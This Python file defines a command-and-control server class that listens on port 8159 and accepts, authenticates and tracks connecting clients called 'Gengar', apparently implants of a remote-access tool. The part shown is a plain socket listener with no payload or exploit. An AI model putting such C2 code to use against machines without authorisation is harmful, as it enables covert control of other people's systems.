import socket
import threading
from dataclasses import dataclass

import output
from gengar import Gengar, GengarAuthenticationFailed
from logger import logger


@dataclass
class CNCServer:
    port: int = 8159

    sock = socket.socket()
    _gengars = []

    def __post_init__(self):
        output.create_output_dir()

    @property
    def gengars(self):
        return [gengar for gengar in self._gengars if gengar.alive]

    @property
    def dead_gengars(self):
        return [gengar for gengar in self._gengars if not gengar.alive]

    def start(self):
        logger.info(f'Starting the CNC server at :{self.port}')
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(('0.0.0.0', self.port))
        self.sock.listen()
        threading.Thread(target=self.accept_forever, daemon=True).start()

    def accept_forever(self):
        logger.info('Waiting for connections.')
        while True:
            gengar_sock, (gengar_host, _) = self.sock.accept()
            logger.info(f'Received connection @ {gengar_host}')
            gengar = Gengar(gengar_sock, gengar_host)
            try:
                gengar.auth()
                gengar.init()
                self._gengars.append(gengar)
            except GengarAuthenticationFailed:
                logger.error('Failed to authenticate Gengar.')
                gengar_sock.close()
            except ConnectionResetError:
                logger.error('Gengar disconnected during initialization.')
                gengar_sock.close()
